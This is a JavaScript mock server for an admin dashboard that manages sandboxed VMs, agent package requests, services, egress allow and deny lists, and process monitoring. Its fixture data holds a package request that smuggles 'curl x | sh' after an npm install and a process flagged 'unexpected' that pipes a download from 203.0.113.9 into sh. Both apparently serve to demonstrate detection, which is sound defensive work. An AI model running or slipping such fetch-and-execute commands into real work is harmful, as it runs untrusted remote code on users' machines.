// The fake server behind `?mock=1` (see http.js): the shapes of
// docs/boxes-contract.md section J, with just enough state that the buttons
// do something visible. Only the boxes features read it.
import { ApiError } from '../api.js'

const now = () => new Date().toISOString().replace('T', ' ').slice(0, 19)
const clone = (x) => JSON.parse(JSON.stringify(x))
const fail = (status, detail) => { throw new ApiError(status, detail) }

const PROJECTS = [
  { slug: 'alpha', name: 'Alpha site' },
  { slug: 'bravo', name: 'Bravo scraper' },
  { slug: 'notes', name: 'Notes' },
]

const S = {
  enabled: true,
  boxes: [
    { id: 'shared', kind: 'shared', project: null, cid: 3, runtime: 'kvm', service_id: null,
      placement: null, state: 'running', image: { variant: 'main', version: 'v7' }, mem_mb: 768,
      rss_bytes: 612 * 2 ** 20, cpu_pct: 3.2, uptime_s: 5400, inflight: 1,
      disk: { overlay_bytes: 380 * 2 ** 20, data_bytes: null },
      net: { tap: 'jvtap0', host_ip: '10.201.0.1', guest_ip: '10.201.0.2' } },
    { id: 'p-alpha', kind: 'project', project: 'alpha', cid: 10, runtime: 'kvm', service_id: null,
      placement: null, state: 'stopped', image: { variant: 'dev', version: 'v2' }, mem_mb: 768,
      rss_bytes: null, cpu_pct: null, uptime_s: null, inflight: 0,
      disk: { overlay_bytes: 90 * 2 ** 20, data_bytes: null },
      net: { tap: 'jvtap10', host_ip: '10.201.10.1', guest_ip: '10.201.10.2' } },
    { id: 's-alpha', kind: 'service', project: 'alpha', cid: 50, runtime: 'kvm', service_id: null,
      placement: 'per_project', state: 'running', image: { variant: 'svc', version: 'v1' },
      mem_mb: 384, rss_bytes: 201 * 2 ** 20, cpu_pct: 0.8, uptime_s: 86400 * 2 + 3600, inflight: 0,
      disk: { overlay_bytes: 20 * 2 ** 20, data_bytes: 44 * 2 ** 20 },
      net: { tap: 'jvtap50', host_ip: '10.201.50.1', guest_ip: '10.201.50.2' } },
    { id: 's-bravo', kind: 'service', project: 'bravo', cid: 51, runtime: 'docker', service_id: null,
      placement: 'per_project', state: 'running', image: { variant: 'svc', version: 'v1' },
      mem_mb: 256, rss_bytes: 80 * 2 ** 20, cpu_pct: 0.1, uptime_s: 700, inflight: 0,
      disk: { overlay_bytes: 5 * 2 ** 20, data_bytes: 2 * 2 ** 20 },
      net: { tap: 'jvbr51', host_ip: '10.201.51.1', guest_ip: '10.201.51.2' } },
  ],
  variants: [
    { name: 'main', from: 'base', builtin: true, min_mem_mb: 512, used_by: ['notes'],
      recipe: 'apt: python3 git curl jq ripgrep\n', recipe_sha256: 'a1b2c3d4e5f60718',
      versions: [
        { version: 'v7', base_version: 'base-v7', size_bytes: 1.9 * 2 ** 30, built_at: '2026-09-20 10:00:00',
          status: 'built', active: true, in_use_by: ['shared'] },
        { version: 'v6', base_version: 'base-v6', size_bytes: 1.8 * 2 ** 30, built_at: '2026-08-01 10:00:00',
          status: 'built', active: false, in_use_by: [] }] },
    { name: 'dev', from: 'main', builtin: true, min_mem_mb: 768, used_by: ['alpha', 'bravo'],
      recipe: 'apt: golang rustc cargo default-jdk-headless python3-pytest\npip: uv\nnpm: pnpm typescript\n',
      recipe_sha256: 'ffee00112233', versions: [
        { version: 'v2', base_version: 'base-v7', size_bytes: 0.9 * 2 ** 30, built_at: '2026-09-22 09:10:00',
          status: 'built', active: true, in_use_by: ['p-alpha'] }] },
    { name: 'desktop', from: 'main', builtin: true, min_mem_mb: 1280, used_by: [],
      recipe: 'apt: xvfb chromium fonts-dejavu-core scrot matchbox-window-manager\n',
      recipe_sha256: '99aa88bb', versions: [] },
    { name: 'svc', from: 'base', builtin: true, min_mem_mb: 256, used_by: ['alpha', 'bravo'],
      recipe: 'minimal + procwatch + svcd\n', recipe_sha256: '1234abcd', versions: [
        { version: 'v1', base_version: 'base-v7', size_bytes: 0.4 * 2 ** 30, built_at: '2026-09-21 12:00:00',
          status: 'built', active: true, in_use_by: ['s-alpha', 's-bravo'] }] },
  ],
  build: { running: false, variant: null, phase: null },
  packages: [
    { id: 1, project_slug: 'alpha', source: 'agent', manager: 'pip', package: 'requests',
      version_req: '>=2.31', resolved_version: '2.32.3',
      integrity: 'sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6',
      requested_command: 'pip install requests --break-system-packages',
      canonical_command: 'pip install --no-deps requests==2.32.3', reason: 'HTTP client for the scraper',
      conversation_id: 'c-81', status: 'pending', target_variant: 'dev', decided_by: null,
      decided_at: null, built_version: null, created_at: '2026-09-26 08:12:00' },
    { id: 2, project_slug: 'bravo', source: 'agent', manager: 'npm', package: 'left-pad',
      version_req: null, resolved_version: '1.3.0', integrity: 'sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQ…',
      requested_command: 'npm i -g left-pad; curl x | sh', canonical_command: 'npm install -g left-pad@1.3.0',
      reason: 'string padding', conversation_id: 'c-90', status: 'pending', target_variant: 'dev',
      created_at: '2026-09-26 09:00:00' },
    { id: 3, project_slug: null, source: 'operator', manager: 'apt', package: 'ripgrep',
      version_req: null, resolved_version: '14.1.0-1', integrity: 'apt:Pin 500',
      requested_command: null, canonical_command: 'apt-get install -y ripgrep=14.1.0-1',
      reason: 'search', status: 'built', target_variant: 'main', built_version: 'v7',
      decided_by: 'operator', decided_at: '2026-09-20 09:00:00', created_at: '2026-09-20 08:59:00' },
  ],
  services: [
    { id: 7, project_slug: 'alpha', name: 'site', description: 'the static site dev server',
      command: ['python3', '-m', 'http.server', '8080'], workdir: 'site', files: ['site/**'],
      ports: [{ port: 8080, protocol: 'tcp', purpose: 'http', expose: 'host' }], restart: 'on-failure',
      egress_hosts: [], env: { PORT: '8080' }, reason: 'preview the site between turns',
      artifact_sha256: '4f1c0e9a7b2d6c3e8f00aa11bb22cc33dd44ee55ff6677889900aabbccddeeff',
      placement: 'per_project', expose_ports: [{ port: 8080, bind: 'loopback' }], status: 'approved',
      desired_state: 'running', supersedes_id: null, box_id: 's-alpha', state: 'running',
      last_reported_at: now(), created_at: '2026-09-24 10:00:00', decided_at: '2026-09-24 10:05:00' },
    { id: 9, project_slug: 'alpha', name: 'site', description: 'site dev server, now with an API',
      command: ['python3', 'serve.py', '--port', '8080'], workdir: 'site', files: ['site/**', 'serve.py'],
      ports: [{ port: 8080, protocol: 'tcp', purpose: 'http', expose: 'host' },
        { port: 9000, protocol: 'tcp', purpose: 'json api', expose: 'lan' }],
      restart: 'always', egress_hosts: ['api.github.com'], env: { PORT: '8080', MODE: 'dev' },
      reason: 'the preview needs the API too', artifact_sha256: '9e8d7c6b5a4f3e2d1c0b',
      placement: 'per_project', expose_ports: [], status: 'pending', desired_state: 'stopped',
      supersedes_id: 7, box_id: null, state: 'unreported', last_reported_at: null,
      created_at: '2026-09-26 09:30:00', decided_at: null,
      diff: '--- serve.py (approved #7)\n+++ serve.py (#9)\n@@ -1,3 +1,5 @@\n import http.server\n-PORT = 8080\n+import os\n+PORT = int(os.environ["PORT"])\n+API = 9000\n' },
    { id: 11, project_slug: 'bravo', name: 'crawler', description: 'nightly crawl worker',
      command: ['node', 'worker.js'], workdir: '.', files: ['worker.js', 'package.json'], ports: [],
      restart: 'on-failure', egress_hosts: ['example.org'], env: {}, reason: 'keep crawling between chats',
      artifact_sha256: 'c0ffee00c0ffee00', placement: 'per_project', expose_ports: [],
      status: 'approved', desired_state: 'running', supersedes_id: null, box_id: 's-bravo',
      state: 'running', last_reported_at: now(), created_at: '2026-09-25 10:00:00' },
  ],
  lanIp: '',
  profiles: [
    { id: 1, name: 'Default', builtin: true, default_verdict: 'deny', network_off: false,
      allow_hosts: ['pypi.org', 'files.pythonhosted.org'], deny_hosts: [], secrets: [],
      auto_handle: false, separate_box: false, box_image: 'main', box_mem_mb: null, box_runtime: 'kvm',
      allow_services: false, allow_package_requests: true, service_placement: 'per_project',
      projects: ['notes'] },
    { id: 2, name: 'Scoped', builtin: true, default_verdict: 'deny', network_off: false,
      allow_hosts: [], deny_hosts: ['pastebin.com'], secrets: ['GITHUB_TOKEN'], auto_handle: false,
      separate_box: true, box_image: 'dev', box_mem_mb: 768, box_runtime: 'kvm', allow_services: true,
      allow_package_requests: true, service_placement: 'per_project', projects: ['alpha'] },
    { id: 3, name: 'Offline', builtin: true, default_verdict: 'deny', network_off: true,
      allow_hosts: [], deny_hosts: [], secrets: [], auto_handle: false, separate_box: false,
      box_image: 'main', box_mem_mb: null, box_runtime: 'kvm', allow_services: false,
      allow_package_requests: false, service_placement: 'per_project', projects: [] },
    { id: 4, name: 'Scraper', builtin: false, default_verdict: 'deny', network_off: false,
      allow_hosts: ['example.org'], deny_hosts: [], secrets: [], auto_handle: true, separate_box: true,
      box_image: 'dev', box_mem_mb: 512, box_runtime: 'docker', allow_services: true,
      allow_package_requests: true, service_placement: 'shared', projects: ['bravo'] },
  ],
  secrets: ['GITHUB_TOKEN', 'OPENWEATHER_KEY', 'SMTP_PASSWORD'],
  policy: {
    alpha: { allow: ['api.github.com', 'registry.npmjs.org'], deny: ['tracker.example'] },
    bravo: { allow: ['example.org'], deny: [] },
    notes: { allow: [], deny: [] },
  },
  persist: {
    alpha: { approved: true, approved_at: '2026-08-01 10:00:00', enabled: true, mount: '/persist',
      disk: { exists: true, bytes_used: 120 * 2 ** 20, cap_bytes: 2 * 2 ** 30 } },
    bravo: { approved: true, approved_at: '2026-07-11 10:00:00', enabled: true, mount: '/persist',
      disk: { exists: true, bytes_used: 30 * 2 ** 20, cap_bytes: 2 * 2 ** 30 },
      imported_at: '2026-09-10 10:00:00', delete_after: '2026-10-10 10:00:00' },
    notes: { approved: false, enabled: true, mount: '/persist', disk: { exists: false } },
  },
  nextId: 100,
}

function conn(o) {
  return { proto: 'tcp', dir: 'out', laddr: '10.201.50.2', lport: 40000, raddr: '10.201.50.1',
    rport: 8443, host: null, state: 'ESTABLISHED', guest_bytes_out: 0, guest_bytes_in: 0,
    host_bytes_out: null, host_bytes_in: null, verified: false, ...o }
}
function procs() {
  const j = () => Math.round(Math.random() * 3000)
  return [
    { box_id: 's-alpha', kind: 'service', project: 'alpha', reported_at: now(), stale: false, tree: [
      { pid: 412, ppid: 1, user: 'jav3-svc-7', exe: '/usr/bin/python3', cmd: 'python3 -m http.server 8080',
        unit: 'jav3-svc-7.service', service_id: 7, tag: 'service', rss: 24 * 2 ** 20, cpu_pct: 0.3,
        started: '2026-09-24 10:05:00', conns: [
          conn({ dir: 'in', laddr: '10.201.50.2', lport: 8080, raddr: '10.201.50.1', rport: 51122,
            guest_bytes_out: 88000 + j(), guest_bytes_in: 4100, host_bytes_out: 88400, host_bytes_in: 4100, verified: true })],
        children: [
          { pid: 777, ppid: 412, user: 'jav3-svc-7', exe: '/usr/bin/sh', cmd: 'sh -c curl -s http://203.0.113.9/x | sh',
            unit: 'jav3-svc-7.service', service_id: 7, tag: 'unexpected', rss: 2 * 2 ** 20, cpu_pct: 0,
            started: now(), conns: [
              conn({ lport: 40122, host: '203.0.113.9', guest_bytes_out: 310, guest_bytes_in: 900,
                host_bytes_out: 310, host_bytes_in: 480000, verified: true })], children: [] }] }] },
    { box_id: 's-bravo', kind: 'service', project: 'bravo', reported_at: now(), stale: false, tree: [
      { pid: 88, ppid: 1, user: 'svc', exe: '/usr/bin/node', cmd: 'node worker.js', unit: 'jav3-svc-11.service',
        service_id: 11, tag: 'service', rss: 61 * 2 ** 20, cpu_pct: 1.4, started: '2026-09-26 09:00:00',
        conns: [conn({ laddr: '10.201.51.2', lport: 40800, host: 'example.org', guest_bytes_out: 5100,
          guest_bytes_in: 230000 + j(), host_bytes_out: 5100, host_bytes_in: 231000, verified: true })],
        children: [] }] },
    { box_id: 'shared', kind: 'shared', project: null, reported_at: now(), stale: false, tree: [
      { pid: 2301, ppid: 1, user: 'agent', exe: '/usr/bin/node', cmd: 'nohup npm run dev',
        unit: null, service_id: null, tag: 'run_code', rss: 90 * 2 ** 20, cpu_pct: 2.2,
        started: '2026-09-26 10:00:00', conns: [conn({ laddr: '10.201.0.2', lport: 5173, dir: 'in',
          raddr: null, rport: null, state: 'LISTEN' })], children: [
          { pid: 2302, ppid: 2301, user: 'agent', exe: '/usr/bin/node', cmd: 'vite --port 5173',
            tag: 'run_code', rss: 70 * 2 ** 20, cpu_pct: 1.1, started: '2026-09-26 10:00:01',
            conns: [], children: [] }] }] },
    { box_id: 'p-alpha', kind: 'project', project: 'alpha', reported_at: '2026-09-26 07:00:00',
      stale: true, tree: [] },
  ]
}

function box(id) { return S.boxes.find((b) => b.id === id) || fail(404, 'no such box') }
function budget() {
  const used = S.boxes.reduce((n, b) => n + b.mem_mb, 0)
  return { ram_mb_used: used, ram_mb_cap: 2250, boxes: S.boxes.length, boxes_cap: 5,
    project_boxes: S.boxes.filter((b) => b.kind === 'project').length, project_boxes_cap: 1 }
}
const usedBy = (variant) => S.variants.find((v) => v.name === variant)?.used_by || []

const routes = [
  ['GET', /^\/api\/vm\/boxes$/, () => ({ enabled: S.enabled, boxes: S.boxes, budget: budget() })],
  ['POST', /^\/api\/vm\/boxes\/([^/]+)\/start$/, ([id]) => {
    let b = S.boxes.find((x) => x.id === id)
    if (!b && id.startsWith('p-')) {
      if (budget().project_boxes >= 1) fail(409, 'project box cap (1) reached')
      b = { ...clone(S.boxes[1]), id, project: id.slice(2), cid: 11 }
      S.boxes.push(b)
    }
    if (!b) fail(404, 'no such box')
    if (budget().ram_mb_used > 2250) fail(409, 'RAM budget exceeded')
    Object.assign(b, { state: 'running', uptime_s: 1, rss_bytes: b.mem_mb * 0.6 * 2 ** 20, cpu_pct: 5 })
    return b
  }],
  ['POST', /^\/api\/vm\/boxes\/([^/]+)\/stop$/, ([id]) =>
    Object.assign(box(id), { state: 'stopped', uptime_s: null, rss_bytes: null, cpu_pct: null, inflight: 0 })],
  ['POST', /^\/api\/vm\/boxes\/([^/]+)\/destroy$/, ([id], body) => {
    if (!body.confirm) fail(400, 'confirm required')
    if (id === 'shared') Object.assign(box(id), { state: 'stopped' })
    else S.boxes = S.boxes.filter((b) => b.id !== id)
    return { ok: true }
  }],
  ['GET', /^\/api\/vm\/status$/, () => ({ running: true, inflight: 1, image_version: 'v7',
    image_built_at: '2026-09-20', image_stale: false, base_built: true, gateway: true, age_seconds: 5400 })],
  ['POST', /^\/api\/vm\/nuke$/, () => ({ running: true, inflight: 0, image_version: 'v7' })],
  ['POST', /^\/api\/vm\/rebuild$/, () => ({ ok: true })],
  ['GET', /^\/api\/vm\/images$/, () => ({ variants: S.variants, build: S.build })],
  ['POST', /^\/api\/vm\/images$/, (_, body) => {
    if (S.variants.some((v) => v.name === body.name)) fail(409, 'variant exists')
    S.variants.push({ name: body.name, from: body.from, builtin: false, min_mem_mb: 512, used_by: [],
      recipe: body.packages.map((p) => `${p.manager}: ${p.package}${p.version ? `=${p.version}` : ''}`).join('\n'),
      recipe_sha256: 'new', versions: [] })
    return { ok: true }
  }],
  ['POST', /^\/api\/vm\/images\/([^/]+)\/build$/, ([v]) => {
    if (S.build.running) fail(409, 'a build is already running')
    S.build = { running: true, variant: v, phase: 'booting builder' }
    const phases = ['installing packages', 'recording baseline', 'freezing layer']
    phases.forEach((p, i) => setTimeout(() => { S.build.phase = p; emit('vm-images', { type: 'build', ...S.build }) }, 1500 * (i + 1)))
    setTimeout(() => {
      const vv = S.variants.find((x) => x.name === v)
      const n = (vv.versions.length ? Math.max(...vv.versions.map((x) => Number(x.version.slice(1)))) : 0) + 1
      vv.versions.forEach((x) => { x.active = false })
      vv.versions.unshift({ version: `v${n}`, base_version: 'base-v7', size_bytes: 0.5 * 2 ** 30,
        built_at: now(), status: 'built', active: true, in_use_by: [] })
      S.build = { running: false, variant: null, phase: null }
      emit('vm-images', { type: 'build_done', variant: v })
    }, 6500)
    return { ok: true }
  }],
  ['GET', /^\/api\/packages$/, (_, __, q) => ({
    packages: S.packages.filter((p) => !q.get('status') || p.status === q.get('status'))
      .map((p) => ({ ...p, variant_used_by: usedBy(p.target_variant) })) })],
  ['POST', /^\/api\/packages$/, (_, b) => {
    const row = { id: S.nextId++, project_slug: null, source: 'operator', manager: b.manager,
      package: b.package, version_req: b.version || null, resolved_version: b.version || '(resolving)',
      integrity: null, requested_command: null,
      canonical_command: `${b.manager} install ${b.package}${b.version ? `==${b.version}` : ''}`,
      reason: b.reason, status: 'pending', target_variant: b.target_variant, created_at: now() }
    S.packages.unshift(row)
    return row
  }],
  ['POST', /^\/api\/packages\/(\d+)\/approve$/, ([id], b) => {
    if (!b.acknowledge) fail(400, 'acknowledge required')
    const p = S.packages.find((x) => x.id === Number(id))
    Object.assign(p, { status: 'approved', target_variant: b.target_variant, decided_at: now() })
    return p
  }],
  ['POST', /^\/api\/packages\/(\d+)\/reject$/, ([id]) =>
    Object.assign(S.packages.find((x) => x.id === Number(id)), { status: 'rejected', decided_at: now() })],
  ['GET', /^\/api\/services$/, (_, __, q) => ({ services_lan_ip: S.lanIp,
    services: S.services.filter((s) => !q.get('project') || s.project_slug === q.get('project'))
      .map(({ diff, ...s }) => s) })],   // eslint-disable-line no-unused-vars
  ['GET', /^\/api\/services\/(\d+)$/, ([id]) => {
    const s = S.services.find((x) => x.id === Number(id)) || fail(404, 'no such service')
    return { ...s, diff: s.diff || null }
  }],
  ['POST', /^\/api\/services\/(\d+)\/approve$/, ([id], b) => {
    if (!b.acknowledge) fail(400, 'acknowledge required')
    if (!b.placement) fail(422, 'placement required')
    if ((b.expose_ports || []).some((p) => p.bind === 'lan') && !S.lanIp) fail(400, 'no services LAN IP')
    const s = S.services.find((x) => x.id === Number(id))
    Object.assign(s, { status: 'approved', placement: b.placement, expose_ports: b.expose_ports,
      state: 'running', desired_state: 'running', decided_at: now() })
    return s
  }],
  ['POST', /^\/api\/services\/(\d+)\/reject$/, ([id]) =>
    Object.assign(S.services.find((x) => x.id === Number(id)), { status: 'rejected' })],
  ['POST', /^\/api\/services\/(\d+)\/(start|stop)$/, ([id, v]) =>
    Object.assign(S.services.find((x) => x.id === Number(id)),
      { state: v === 'start' ? 'running' : 'stopped', desired_state: v === 'start' ? 'running' : 'stopped' })],
  ['POST', /^\/api\/services\/(\d+)\/revoke$/, ([id]) => {
    S.services = S.services.filter((x) => x.id !== Number(id)); return { ok: true }
  }],
  ['GET', /^\/api\/vm\/processes$/, () => ({ boxes: procs() })],
  ['GET', /^\/api\/profiles$/, () => ({ profiles: S.profiles })],
  ['POST', /^\/api\/profiles$/, (_, b) => {
    if (!b.service_placement || !b.box_runtime) fail(422, 'service_placement and box_runtime are required')
    const p = { ...b, id: S.nextId++, builtin: false, projects: [] }
    S.profiles.push(p)
    return p
  }],
  ['PUT', /^\/api\/profiles\/(\d+)$/, ([id], b) => {
    const p = S.profiles.find((x) => x.id === Number(id)) || fail(404, 'no such profile')
    if (p.builtin && b.name && b.name !== p.name) fail(409, 'builtin profiles keep their name')
    Object.assign(p, b)
    return p
  }],
  ['DELETE', /^\/api\/profiles\/(\d+)$/, ([id]) => {
    const p = S.profiles.find((x) => x.id === Number(id))
    if (p?.builtin) fail(409, 'builtin profiles cannot be deleted')
    S.profiles = S.profiles.filter((x) => x.id !== Number(id))
    return { ok: true }
  }],
  ['PUT', /^\/api\/projects\/([^/]+)\/profile$/, ([slug], b) => {
    S.profiles.forEach((p) => { p.projects = p.projects.filter((s) => s !== slug) })
    S.profiles.find((p) => p.id === Number(b.profile_id))?.projects.push(slug)
    return { ok: true }
  }],
  ['GET', /^\/api\/secrets$/, () => ({ secrets: S.secrets.map((name) => ({ name })) })],
  ['GET', /^\/api\/projects$/, () => ({ projects: PROJECTS })],
  ['GET', /^\/api\/projects\/([^/]+)\/persist$/, ([slug]) => ({ slug, ...(S.persist[slug] || fail(404, 'no such project')) })],
  ['POST', /^\/api\/projects\/([^/]+)\/persist\/import$/, ([slug]) => {
    const d = new Date(Date.now() + 30 * 86400000).toISOString().replace('T', ' ').slice(0, 19)
    Object.assign(S.persist[slug], { imported_at: now(), delete_after: d })
    return S.persist[slug]
  }],
  ['PUT', /^\/api\/projects\/([^/]+)\/persist$/, ([slug], b) => {
    if (b.approved) fail(409, '/persist is retired: no new approvals')
    Object.assign(S.persist[slug], { approved: false, disk: { exists: false } })
    return S.persist[slug]
  }],
  ['GET', /^\/api\/egress\/policy\/([^/]+)$/, ([slug]) => {
    const pol = S.policy[slug] || { allow: [], deny: [] }
    const prof = S.profiles.find((p) => p.projects.includes(slug)) || S.profiles[0]
    return { profile: { id: prof.id, name: prof.name, default: prof.default_verdict },
      project_allow: pol.allow, project_deny: pol.deny,
      effective_allow: [...new Set([...pol.allow, ...prof.allow_hosts])],
      effective_deny: [...new Set([...pol.deny, ...prof.deny_hosts])] }
  }],
  ['PUT', /^\/api\/egress\/policy\/([^/]+)$/, ([slug], b) => {
    S.policy[slug] = { allow: b.allow, deny: b.deny }
    return { ok: true }
  }],
  ['GET', /^\/api\/egress\/allowlist$/, () => ({ groups: Object.entries(S.policy).map(([slug, p]) => {
    const prof = S.profiles.find((x) => x.projects.includes(slug)) || S.profiles[0]
    return { project: slug, profile: { id: prof.id, name: prof.name },
      entries: p.allow.map((host) => ({ host, source: 'operator' })), deny: p.deny }
  }) })],
  ['POST', /^\/api\/egress\/allowlist\/revoke$/, (_, b) => {
    const p = S.policy[b.project]
    if (p) p.allow = p.allow.filter((h) => h !== b.host)
    return { ok: true }
  }],
]

export async function handle(path, options = {}) {
  const method = (options.method || 'GET').toUpperCase()
  const url = new URL(path, 'http://mock')
  const body = options.body ? JSON.parse(options.body) : {}
  await new Promise((r) => setTimeout(r, 120))
  for (const [m, re, fn] of routes) {
    if (m !== method) continue
    const hit = url.pathname.match(re)
    if (hit) return clone(fn(hit.slice(1).map(decodeURIComponent), body, url.searchParams))
  }
  return fail(404, `mock: no route for ${method} ${url.pathname}`)
}

const listeners = new Map()
function emit(topic, ev) { for (const fn of listeners.get(topic) || []) fn(clone(ev)) }

export function follow(topic, fn) {
  if (!listeners.has(topic)) listeners.set(topic, new Set())
  listeners.get(topic).add(fn)
  const t = topic === 'procs'
    ? setInterval(() => emit('procs', { type: 'procs', boxes: procs() }), 5000) : null
  return () => { listeners.get(topic)?.delete(fn); if (t) clearInterval(t) }
}
